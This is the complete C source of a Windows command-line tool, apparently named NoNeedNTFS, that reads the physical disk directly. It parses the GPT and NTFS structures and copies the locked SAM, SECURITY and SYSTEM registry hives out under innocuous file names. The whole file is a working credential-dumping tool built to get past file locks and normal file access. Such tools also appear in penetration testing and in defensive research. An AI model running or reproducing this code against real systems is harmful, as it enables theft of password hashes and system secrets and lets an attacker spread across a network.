#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma pack(push, 1)
struct GPT_HEADER {
    BYTE Signature[8];
    DWORD Revision;
    DWORD HeaderSize;
    DWORD HeaderCRC32;
    DWORD Reserved;
    ULONGLONG CurrentLBA;
    ULONGLONG BackupLBA;
    ULONGLONG FirstUsableLBA;
    ULONGLONG LastUsableLBA;
    BYTE DiskGUID[16];
    ULONGLONG PartitionEntryLBA;
    DWORD NumberOfPartitions;
    DWORD PartitionEntrySize;
    DWORD PartitionArrayCRC32;
};

struct GPT_PARTITION_ENTRY {
    BYTE PartitionTypeGUID[16];
    BYTE UniquePartitionGUID[16];
    ULONGLONG StartingLBA;
    ULONGLONG EndingLBA;
    ULONGLONG Attributes;
    WCHAR PartitionName[36];
};


struct NTFS_BOOT_SECTOR {
    BYTE JumpInstruction[3];
    BYTE OemID[8];
    WORD BytesPerSector;
    BYTE SectorsPerCluster;
    WORD ReservedSectors;
    BYTE Unused1[3];
    WORD Unused2;
    BYTE MediaDescriptor;
    WORD Unused3;
    WORD SectorsPerTrack;
    WORD NumberOfHeads;
    DWORD HiddenSectors;
    DWORD Unused4;
    DWORD Unused5;
    ULONGLONG TotalSectors;
    ULONGLONG MFT_LCN;
    ULONGLONG MFTMirr_LCN;
    BYTE ClustersPerMFTRecord;
    BYTE Unused6[3];
    BYTE ClustersPerIndexBuffer;
    BYTE Unused7[3];
    ULONGLONG VolumeSerialNumber;
    DWORD Checksum;
    BYTE BootstrapCode[426];
    WORD EndOfSectorMarker;
};

struct MFT_ENTRY_HEADER {
    DWORD Signature;
    WORD UpdateSequenceOffset;
    WORD UpdateSequenceSize;
    ULONGLONG LSN;
    WORD SequenceNumber;
    WORD HardLinkCount;
    WORD FirstAttributeOffset;
    WORD Flags;
    DWORD RealSize;
    DWORD AllocatedSize;
    ULONGLONG BaseFileRecord;
    WORD NextAttributeID;
    WORD Unused;
    DWORD MFTRecordNumber;
};

struct ATTRIBUTE_HEADER {
    DWORD AttributeType;
    DWORD Length;
    BYTE NonResident;
    BYTE NameLength;
    WORD NameOffset;
    WORD Flags;
    WORD AttributeID;
};

struct RESIDENT_ATTRIBUTE {
    ATTRIBUTE_HEADER Header;
    DWORD ValueLength;
    WORD ValueOffset;
    BYTE IndexedFlag;
    BYTE Padding;
};

struct NON_RESIDENT_ATTRIBUTE {
    ATTRIBUTE_HEADER Header;
    ULONGLONG StartingVCN;
    ULONGLONG EndingVCN;
    WORD DataRunsOffset;
    WORD CompressionUnitSize;
    DWORD Padding;
    ULONGLONG AllocatedSize;
    ULONGLONG RealSize;
    ULONGLONG InitializedSize;
};

struct FILE_NAME_ATTRIBUTE {
    ULONGLONG ParentDirectory;
    ULONGLONG CreationTime;
    ULONGLONG ModificationTime;
    ULONGLONG MFTChangeTime;
    ULONGLONG LastAccessTime;
    ULONGLONG AllocatedSize;
    ULONGLONG RealSize;
    DWORD FileAttributes;
    DWORD ReparsePointTag;
    BYTE FileNameLength;
    BYTE NamespaceType;
    WCHAR FileName[1];
};
#pragma pack(pop)


ULONGLONG g_BytesPerSector = 512;
ULONGLONG g_SectorsPerCluster = 0;
ULONGLONG g_CDriveStartLBA = 0;
ULONGLONG g_MFT_LCN = 0;
ULONGLONG g_ClusterSize = 0;


const BYTE BASIC_DATA_GUID[16] = {
    0xA2, 0xA0, 0xD0, 0xEB, 0xE5, 0xB9, 0x33, 0x44,
    0x87, 0xC0, 0x68, 0xB6, 0xB7, 0x26, 0x99, 0xC7
};


struct DataRun {
    ULONGLONG length_clusters;
    LONGLONG offset_lcn;
    ULONGLONG absolute_lcn;
};


struct TargetFile {
    const char* name;
    bool enabled;
    bool found;
    int mft_entry;
    ULONGLONG file_size;
    const char* output_filename;
};


bool IsGPTDisk(HANDLE hDisk) {
    BYTE mbr[512];
    LARGE_INTEGER offset;
    offset.QuadPart = 0;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

    DWORD bytesRead;
    if (!ReadFile(hDisk, mbr, 512, &bytesRead, NULL)) {
        return false;
    }

    return (mbr[0x1C2] == 0xEE);
}

bool FindCDriveStartLBA(HANDLE hDisk) {

    BYTE gpt_header_buffer[512];
    LARGE_INTEGER offset;
    offset.QuadPart = 512;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

    DWORD bytesRead;
    if (!ReadFile(hDisk, gpt_header_buffer, 512, &bytesRead, NULL)) {
        printf("[-] Failed to read GPT header\n");
        return false;
    }

    const GPT_HEADER* gpt = (const GPT_HEADER*)gpt_header_buffer;

    if (memcmp(gpt->Signature, "EFI PART", 8) != 0) {
        printf("[-] Invalid GPT signature\n");
        return false;
    }

    printf("  [+] GPT Header, Partition Entry LBA Section: %llu\n", gpt->PartitionEntryLBA);
    printf("  [+] GPT Header, Number of Partitions: %u\n", gpt->NumberOfPartitions);

    const DWORD ENTRIES_PER_SECTOR = 512 / 128;
    DWORD sectorsToRead = (gpt->NumberOfPartitions + ENTRIES_PER_SECTOR - 1) / ENTRIES_PER_SECTOR;

    for (DWORD sector = 0; sector < sectorsToRead; sector++) {
        BYTE partition_buffer[512];
        offset.QuadPart = (gpt->PartitionEntryLBA + sector) * 512;
        SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

        if (!ReadFile(hDisk, partition_buffer, 512, &bytesRead, NULL)) {
            continue;
        }

        for (DWORD i = 0; i < ENTRIES_PER_SECTOR; i++) {
            const GPT_PARTITION_ENTRY* entry = (const GPT_PARTITION_ENTRY*)(partition_buffer + i * 128);


            if (memcmp(entry->PartitionTypeGUID, BASIC_DATA_GUID, 16) == 0) {
                ULONGLONG size = entry->EndingLBA - entry->StartingLBA;


                if (size > 1000000) {
                    g_CDriveStartLBA = entry->StartingLBA;
                    printf("  [+] Maybe Drive at this LBA %llu\n", g_CDriveStartLBA);
                    printf("  [+] Drive size: %.2f GB\n\n", (size * 512) / (1024.0 * 1024.0 * 1024.0));
                    return true;
                }
            }
        }
    }

    printf("[-] Drive not found\n");
    return false;
}

bool DetectNTFSParameters(HANDLE hDisk) {
    BYTE boot_sector[512];
    LARGE_INTEGER offset;
    offset.QuadPart = g_CDriveStartLBA * 512;
    SetFilePointerEx(hDisk, offset, NULL, FILE_BEGIN);

    DWORD bytesRead;
    if (!ReadFile(hDisk, boot_sector, 512, &bytesRead, NULL)) {
        printf("[-] Failed to read boot sector\n");
        return false;
    }

    if (memcmp(boot_sector + 3, "NTFS    ", 8) != 0) {
        printf("[-] Not an NTFS partition\n");
        return false;
    }

    const NTFS_BOOT_SECTOR* bs = (const NTFS_BOOT_SECTOR*)boot_sector;

    g_SectorsPerCluster = bs->SectorsPerCluster;
    g_MFT_LCN = bs->MFT_LCN;
    g_ClusterSize = bs->BytesPerSector * g_SectorsPerCluster;

    printf("[+] NTFS detected\n");

    ULONGLONG mft_physical_lba = g_CDriveStartLBA + (g_MFT_LCN * g_SectorsPerCluster);
    printf("[+] MFT Physical LBA: %llu\n", mft_physical_lba);

    return true;
}


void WideCharToASCII(const WCHAR* wide, char* ascii, int maxLen) {
    int i;
    for (i = 0; i < maxLen - 1 && wide[i] != 0; i++) {
        ascii[i] = (char)wide[i];
    }
    ascii[i] = '\0';
}

int ParseDataRuns(const BYTE* data_runs, DataRun* runs, int max_runs) {
    int run_count = 0;
    ULONGLONG current_lcn = 0;
    int offset_in_runs = 0;

    while (run_count < max_runs) {
        BYTE header = data_runs[offset_in_runs];

        if (header == 0x00) break;

        BYTE length_bytes = header & 0x0F;
        BYTE offset_bytes = (header >> 4) & 0x0F;
        offset_in_runs++;

        ULONGLONG length = 0;
        for (int i = 0; i < length_bytes; i++) {
            length |= ((ULONGLONG)data_runs[offset_in_runs + i]) << (i * 8);
        }
        offset_in_runs += length_bytes;

        LONGLONG offset = 0;
        for (int i = 0; i < offset_bytes; i++) {
            offset |= ((LONGLONG)data_runs[offset_in_runs + i]) << (i * 8);
        }

        if (offset_bytes > 0 && (data_runs[offset_in_runs + offset_bytes - 1] & 0x80)) {
            for (int i = offset_bytes; i < 8; i++) {
                offset |= ((LONGLONG)0xFF) << (i * 8);
            }
        }
        offset_in_runs += offset_bytes;

        current_lcn += offset;

        runs[run_count].length_clusters = length;
        runs[run_count].offset_lcn = offset;
        runs[run_count].absolute_lcn = current_lcn;
        run_count++;
    }

    return run_count;
}

bool FindFileName(const BYTE* mft_entry, char* filename_out, int max_len) {
    const MFT_ENTRY_HEADER* header = (const MFT_ENTRY_HEADER*)mft_entry;

    if (header->Signature != 0x454C4946) return false;
    if (!(header->Flags & 0x01)) return false;

    char longest_name[256] = { 0 };
    int max_name_len = 0;
    bool found_any = false;

    DWORD offset = header->FirstAttributeOffset;

    while (offset < 1024 && offset > 0) {
        const ATTRIBUTE_HEADER* attr = (const ATTRIBUTE_HEADER*)(mft_entry + offset);

        if (attr->AttributeType == 0xFFFFFFFF || attr->Length == 0) break;

        if (attr->AttributeType == 0x30) {
            if (attr->NonResident == 0) {
                const RESIDENT_ATTRIBUTE* res_attr = (const RESIDENT_ATTRIBUTE*)(mft_entry + offset);
                const FILE_NAME_ATTRIBUTE* fn_attr = (const FILE_NAME_ATTRIBUTE*)(mft_entry + offset + res_attr->ValueOffset);

                int name_len = fn_attr->FileNameLength;
                if (name_len > 0 && name_len < 256) {
                    char temp_name[256] = { 0 };
                    WideCharToASCII(fn_attr->FileName, temp_name, sizeof(temp_name));

                    if (name_len > max_name_len) {
                        max_name_len = name_len;
                        strcpy(longest_name, temp_name);
                        found_any = true;
                    }
                }
            }
        }

        offset += attr->Length;
    }

    if (found_any) {
        strcpy(filename_out, longest_name);

        int len = strlen(filename_out);
        while (len > 0 && (filename_out[len - 1] < 32 || filename_out[len - 1] > 126)) {
            filename_out[len - 1] = '\0';
            len--;
        }

        return true;
    }

    return false;
}

bool ExtractNonResidentFile(HANDLE hDisk, const BYTE* mft_entry, const char* output_filename, ULONGLONG* saved_position) {
    const MFT_ENTRY_HEADER* header = (const MFT_ENTRY_HEADER*)mft_entry;

    if (header->Signature != 0x454C4946) return false;

    // Save current file pointer position
    LARGE_INTEGER current_pos;
    current_pos.QuadPart = 0;
    SetFilePointerEx(hDisk, current_pos, &current_pos, FILE_CURRENT);
    *saved_position = current_pos.QuadPart;

    DWORD offset = header->FirstAttributeOffset;

    while (offset < 1024 && offset > 0) {
        const ATTRIBUTE_HEADER* attr = (const ATTRIBUTE_HEADER*)(mft_entry + offset);

        if (attr->AttributeType == 0xFFFFFFFF || attr->Length == 0) break;

        if (attr->AttributeType == 0x80) {
            if (attr->NonResident == 1) {
                const NON_RESIDENT_ATTRIBUTE* nonres_attr = (const NON_RESIDENT_ATTRIBUTE*)(mft_entry + offset);

                ULONGLONG real_size = nonres_attr->RealSize;
                ULONGLONG allocated_size = nonres_attr->AllocatedSize;

                printf("  [+] Size: %llu bytes (%.2f KB)\n", real_size, real_size / 1024.0);

                const BYTE* data_runs = mft_entry + offset + nonres_attr->DataRunsOffset;
                DataRun runs[32];
                int run_count = ParseDataRuns(data_runs, runs, 32);

                if (run_count == 0) {
                    printf("   [-] No data runs found!\n");
                    return false;
                }

                BYTE* file_buffer = (BYTE*)malloc((size_t)allocated_size);
                if (!file_buffer) {
                    printf("  [-] Failed to allocate %llu bytes\n", allocated_size);
                    return false;
                }

                ULONGLONG buffer_offset = 0;

                for (int i = 0; i < run_count; i++) {
                    ULONGLONG lcn = runs[i].absolute_lcn;
                    ULONGLONG num_clusters = runs[i].length_clusters;
                    ULONGLONG cluster_bytes = num_clusters * g_ClusterSize;

                    ULONGLONG physical_lba = g_CDriveStartLBA + (lcn * g_SectorsPerCluster);
                    ULONGLONG physical_offset = physical_lba * g_BytesPerSector;

                    LARGE_INTEGER seek_offset;
                    seek_offset.QuadPart = physical_offset;

                    if (!SetFilePointerEx(hDisk, seek_offset, NULL, FILE_BEGIN)) {
                        printf("  [-]  Failed to seek run #%d\n", i + 1);
                        free(file_buffer);
                        return false;
                    }

                    DWORD bytes_to_read = (DWORD)cluster_bytes;
                    DWORD bytes_read = 0;

                    if (!ReadFile(hDisk, file_buffer + buffer_offset, bytes_to_read, &bytes_read, NULL)) {
                        printf("  [-] Failed to read run #%d\n", i + 1);
                        free(file_buffer);
                        return false;
                    }

                    buffer_offset += bytes_read;
                }

                FILE* out = fopen(output_filename, "wb");
                if (!out) {
                    printf("  [-] Failed to open output file\n");
                    free(file_buffer);
                    return false;
                }

                fwrite(file_buffer, 1, (size_t)real_size, out);
                fclose(out);
                free(file_buffer);

                printf("  [SAVED] %s (%llu bytes)\n", output_filename, real_size);

       
                LARGE_INTEGER restore_pos;
                restore_pos.QuadPart = *saved_position;
                SetFilePointerEx(hDisk, restore_pos, NULL, FILE_BEGIN);

                return true;
            }
        }

        offset += attr->Length;
    }

    return false;
}

bool MatchesTarget(const char* filename, const char* target) {
    if (strcmp(filename, target) == 0) return true;
    if (_stricmp(filename, target) == 0) return true;

    if (strcmp(target, "SAM") == 0) {
        if (strncmp(filename, "SAM", 3) == 0 && strlen(filename) <= 4) {
            return true;
        }
    }

    return false;
}

void PrintUsage() {
    printf("Usage: NoNeedNTFS.exe <mode>\n\n");
    printf("Modes:\n");
    printf("  s1   - Extract SAM only\n");
    printf("  s2   - Extract SECURITY only\n");
    printf("  s3   - Extract SYSTEM only\n");
    printf("  all  - Extract all three files\n\n");
}



int main(int argc, char* argv[]) {

    if (argc < 2) {
        PrintUsage();
        return 1;
    }

    const char* mode = argv[1];

    TargetFile targets[] = {
        {"SAM", false, false, 0, 0, "S1.bin"},
        {"SECURITY", false, false, 0, 0, "S2.bin"},
        {"SYSTEM", false, false, 0, 0, "S3.bin"}
    };
    int target_count = 3;

    printf("NoNeedNTFS :)\n");
    printf("By ShkudW, https://github.com/ShkudW/NoNeedNTFS");
    printf("\n\n");
    printf("[#] looking for... %s\n\n", mode);
    if (strcmp(mode, "s1") == 0) {
        targets[0].enabled = true;
    }
    else if (strcmp(mode, "s2") == 0) {
        targets[1].enabled = true;

    }
    else if (strcmp(mode, "s3") == 0) {
        targets[2].enabled = true;

    }
    else if (strcmp(mode, "all") == 0) {
        targets[0].enabled = true;
        targets[1].enabled = true;
        targets[2].enabled = true;

    }
    else {
        printf("[WTF??] Invalid mode: %s\n\n", mode);
        PrintUsage();
        return 1;
    }


    int enabled_count = 0;
    for (int t = 0; t < target_count; t++) {
        if (targets[t].enabled) enabled_count++;
    }

    HANDLE hDisk = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

    if (hDisk == INVALID_HANDLE_VALUE) {
        printf("Error 5..\n");
        return 1;
    }

    printf("[+] PhysicalDrive0\n");

    if (!IsGPTDisk(hDisk)) {
        printf("[ERROR] Not a GPT disk\n");
        CloseHandle(hDisk);
        return 1;
    }
    printf("[+] GPT disk\n");

  
    if (!FindCDriveStartLBA(hDisk)) {
        CloseHandle(hDisk);
        return 1;
    }
    printf("[+] Drive found\n");

    if (!DetectNTFSParameters(hDisk)) {
        CloseHandle(hDisk);
        return 1;
    }

    // Calculate MFT location
    ULONGLONG mft_physical_lba = g_CDriveStartLBA + (g_MFT_LCN * g_SectorsPerCluster);
    ULONGLONG mft_physical_offset = mft_physical_lba * g_BytesPerSector;
    printf("[+] MFT at LBA %llu (offset %llu bytes)\n", mft_physical_lba, mft_physical_offset);

    // Seek to MFT
    LARGE_INTEGER mft_offset;
    mft_offset.QuadPart = mft_physical_offset;

    if (!SetFilePointerEx(hDisk, mft_offset, NULL, FILE_BEGIN)) {
        printf("[ERROR] Failed to seek to MFT\n");
        CloseHandle(hDisk);
        return 1;
    }


    const DWORD MFT_ENTRY_SIZE = 1024;
    BYTE mft_entry[MFT_ENTRY_SIZE];
    DWORD bytes_read = 0;

    LARGE_INTEGER skip_offset;
    skip_offset.QuadPart = mft_physical_offset + (100000 * MFT_ENTRY_SIZE);
    SetFilePointerEx(hDisk, skip_offset, NULL, FILE_BEGIN);

    int max_entries = 5000000;
    int found_count = 0;

    for (int i = 0; i < max_entries && found_count < enabled_count; i++) {
        int actual_entry = 0 + i;

        if (!ReadFile(hDisk, mft_entry, MFT_ENTRY_SIZE, &bytes_read, NULL)) {
            break;
        }

        if (bytes_read != MFT_ENTRY_SIZE) {
            break;
        }


        char filename[256] = { 0 };
        if (FindFileName(mft_entry, filename, sizeof(filename))) {
            const MFT_ENTRY_HEADER* header = (const MFT_ENTRY_HEADER*)mft_entry;

            if (!(header->Flags & 0x02)) { 
                for (int t = 0; t < target_count; t++) {
                    if (targets[t].enabled && !targets[t].found && MatchesTarget(filename, targets[t].name)) {
                        printf("\n[+]Found %s at MFT entry #%d\n", targets[t].name, actual_entry);
                        targets[t].found = true;
                        targets[t].mft_entry = actual_entry;
                        found_count++;

                        ULONGLONG saved_pos = 0;
                        if (ExtractNonResidentFile(hDisk, mft_entry, targets[t].output_filename, &saved_pos)) {
                        }
                        else {
                            printf("[FAILED] Could not extract %s\n\n", targets[t].name);
                        }
                    }
                }
            }
        }
    }

    CloseHandle(hDisk);

    return (found_count == enabled_count) ? 0 : 1;
}

